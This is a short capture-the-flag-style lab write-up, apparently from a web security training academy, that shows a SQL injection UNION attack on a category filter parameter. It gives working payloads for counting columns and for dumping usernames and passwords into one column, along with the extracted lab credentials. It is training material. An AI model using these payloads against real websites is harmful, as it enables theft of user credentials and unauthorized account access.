# Lab: SQL injection UNION attack, retrieving multiple values in a single column
## Description

Vulnerable path and parameter `/filter?category=Gifts`

Found the number of columns (2) used in the SQL query using this payload:
```
'+UNION+SELECT+NULL,NULL--
```

Extract username and passwords using:
```
'+UNION+SELECT+NULL,username+FROM+users--
'+UNION+SELECT+NULL,password+FROM+users--
```

The data extracted was
```
dtzdllozgs4ml7pemuh2
tq80az4zoy8u6i7nol1v
c422t611f6wkf5m4l9f5
administrator
carlos
wiener
```

This output was not returned in order, so simple brute-force of the passwords gathered was used against the `administrator` account. In a real-world secnario, this would have resulted in the account getting logged out or the admin getting notified. To avoid this, we can do two things:
1) Combine username and password in the same column
2) Order By

Well, turns out using `ORDER BY 1` didn't work after all, data was still returned in an un-ordered fasion... 
```
'+UNION+SELECT+NULL,password+FROM+users+order+by+1--
```
So combining the values `username` and `password` is a must...
```
'+UNION+SELECT+NULL,username||'%3a'||password+FROM+users+order+by+1--
```



## Solution
`'+UNION+SELECT+NULL,username||'%3a'||password+FROM+users+order+by+1--`

returned

`administrator:c422t611f6wkf5m4l9f5`
